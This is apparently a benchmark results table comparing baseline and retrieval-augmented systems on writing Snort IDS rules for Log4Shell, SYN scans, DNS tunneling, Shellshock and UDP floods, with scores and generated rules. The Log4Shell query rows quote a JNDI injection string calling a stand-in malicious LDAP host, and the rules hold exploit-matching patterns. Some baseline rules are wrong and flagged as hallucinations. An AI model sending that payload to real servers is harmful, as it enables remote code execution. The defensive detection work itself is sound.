query_id,architecture,query,precision_at_3,recall_at_3,recall_at_5,mrr,ndcg_at_5,family_accuracy,type_accuracy,protocol_accuracy,port_accuracy,snort_syntax_valid,rule_token_jaccard,hallucination_flag,expected_doc_id,retrieved_ids,generated_family,expected_family,generated_type,expected_type,generated_rule
Q_001,baseline,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0100,,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_001,rag_classic,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_001,rag_rerank,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_001,rag_hybrid,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_001,multi_hop,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0151;SNORT_0083,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_001,graph_rag,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0100,SNORT_0032;SNORT_0066;SNORT_0049;SNORT_0100;SNORT_0134,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_001,agentic_rag,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9130434782608695,0.0,SNORT_0100,SNORT_0066;SNORT_0100;SNORT_0032;SNORT_0083;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)"
Q_002,baseline,How can we detect rule for tcp syn port scan on the network.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,SNORT_0001,,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_002,rag_classic,How can we detect rule for tcp syn port scan on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0001,SNORT_0001;SNORT_0103;SNORT_0035;SNORT_0154;SNORT_0086,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_002,rag_rerank,How can we detect rule for tcp syn port scan on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0001,SNORT_0001;SNORT_0103;SNORT_0035;SNORT_0154;SNORT_0086,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_002,rag_hybrid,How can we detect rule for tcp syn port scan on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0001,SNORT_0001;SNORT_0103;SNORT_0035;SNORT_0154;SNORT_0086,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_002,multi_hop,How can we detect rule for tcp syn port scan on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0001,SNORT_0001;SNORT_0103;SNORT_0137;SNORT_0035;SNORT_0154,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_002,graph_rag,How can we detect rule for tcp syn port scan on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0001,SNORT_0001;SNORT_0103;SNORT_0035;SNORT_0052;SNORT_0069,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_002,agentic_rag,How can we detect rule for tcp syn port scan on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0001,SNORT_0001;SNORT_0103;SNORT_0035;SNORT_0154;SNORT_0086,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_003,baseline,Generate a Snort rule to sOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,1.0,SNORT_0149,,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000030; rev:1;)"
Q_003,rag_classic,Generate a Snort rule to sOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0149,SNORT_0149;SNORT_0115;SNORT_0030;SNORT_0064;SNORT_0013,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000149; rev:1;)"
Q_003,rag_rerank,Generate a Snort rule to sOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0149,SNORT_0149;SNORT_0115;SNORT_0030;SNORT_0064;SNORT_0013,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000149; rev:1;)"
Q_003,rag_hybrid,Generate a Snort rule to sOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0149,SNORT_0149;SNORT_0115;SNORT_0030;SNORT_0013;SNORT_0064,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000149; rev:1;)"
Q_003,multi_hop,Generate a Snort rule to sOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0149,SNORT_0149;SNORT_0115;SNORT_0030;SNORT_0013;SNORT_0064,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000149; rev:1;)"
Q_003,graph_rag,Generate a Snort rule to sOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0149,SNORT_0149;SNORT_0115;SNORT_0030;SNORT_0013;SNORT_0132,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000149; rev:1;)"
Q_003,agentic_rag,Generate a Snort rule to sOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0149,SNORT_0149;SNORT_0115;SNORT_0030;SNORT_0013;SNORT_0064,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000149; rev:1;)"
Q_004,baseline,I need detection for identify HTTP requests containing the Shellshock () { pattern.,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.3333333333333333,1.0,SNORT_0135,,Brute_Force,Exploitation,SSH Brute Force,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000009; rev:1;)"
Q_004,rag_classic,I need detection for identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0135,SNORT_0033;SNORT_0135;SNORT_0152;SNORT_0084;SNORT_0101,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)"
Q_004,rag_rerank,I need detection for identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0135,SNORT_0033;SNORT_0135;SNORT_0152;SNORT_0084;SNORT_0101,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)"
Q_004,rag_hybrid,I need detection for identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0135,SNORT_0033;SNORT_0135;SNORT_0152;SNORT_0084;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)"
Q_004,multi_hop,I need detection for identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0135,SNORT_0033;SNORT_0135;SNORT_0152;SNORT_0084;SNORT_0101,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)"
Q_004,graph_rag,I need detection for identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0135,SNORT_0033;SNORT_0135;SNORT_0101;SNORT_0152;SNORT_0016,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)"
Q_004,agentic_rag,I need detection for identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0135,SNORT_0033;SNORT_0135;SNORT_0152;SNORT_0084;SNORT_0067,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)"
Q_005,baseline,Generate a Snort rule to need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,1.0,SNORT_0081,,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000013; rev:1;)"
Q_005,rag_classic,Generate a Snort rule to need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0081,SNORT_0132;SNORT_0081;SNORT_0047;SNORT_0064;SNORT_0030,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000132; rev:1;)"
Q_005,rag_rerank,Generate a Snort rule to need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0081,SNORT_0132;SNORT_0081;SNORT_0047;SNORT_0064;SNORT_0030,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000132; rev:1;)"
Q_005,rag_hybrid,Generate a Snort rule to need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0081,SNORT_0132;SNORT_0081;SNORT_0047;SNORT_0064;SNORT_0030,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000132; rev:1;)"
Q_005,multi_hop,Generate a Snort rule to need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0081,SNORT_0132;SNORT_0081;SNORT_0047;SNORT_0064;SNORT_0098,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000132; rev:1;)"
Q_005,graph_rag,Generate a Snort rule to need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0081,SNORT_0132;SNORT_0081;SNORT_0047;SNORT_0013;SNORT_0149,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000132; rev:1;)"
Q_005,agentic_rag,Generate a Snort rule to need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0081,SNORT_0132;SNORT_0081;SNORT_0047;SNORT_0064;SNORT_0030,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000132; rev:1;)"
Q_006,baseline,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 123.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.375,1.0,SNORT_0004,,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,UDP Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_006,rag_classic,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 123.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0004,SNORT_0004;SNORT_0106;SNORT_0140;SNORT_0072;SNORT_0055,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000004; rev:1;)"
Q_006,rag_rerank,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 123.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0004,SNORT_0004;SNORT_0106;SNORT_0140;SNORT_0072;SNORT_0055,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000004; rev:1;)"
Q_006,rag_hybrid,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 123.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0004,SNORT_0004;SNORT_0072;SNORT_0140;SNORT_0106;SNORT_0088,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000004; rev:1;)"
Q_006,multi_hop,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 123.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0004,SNORT_0004;SNORT_0140;SNORT_0106;SNORT_0072;SNORT_0021,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000004; rev:1;)"
Q_006,graph_rag,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 123.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0004,SNORT_0004;SNORT_0140;SNORT_0106;SNORT_0072;SNORT_0157,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000004; rev:1;)"
Q_006,agentic_rag,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 123.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0004,SNORT_0004;SNORT_0072;SNORT_0140;SNORT_0106;SNORT_0088,DoS_DDoS,DoS_DDoS,UDP Flood,UDP Flood,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000004; rev:1;)"
Q_007,baseline,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9166666666666666,1.0,SNORT_0137,,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_007,rag_classic,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0069;SNORT_0018;SNORT_0086;SNORT_0120,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_007,rag_rerank,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0069;SNORT_0018;SNORT_0001;SNORT_0086,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_007,rag_hybrid,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0069;SNORT_0018;SNORT_0086;SNORT_0120,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
Q_007,multi_hop,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0137,SNORT_0137;SNORT_0018;SNORT_0069;SNORT_0086;SNORT_0120,Reconnaissance,Reconnaissance,TCP SYN Port Scan,TCP SYN Port Scan,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)"
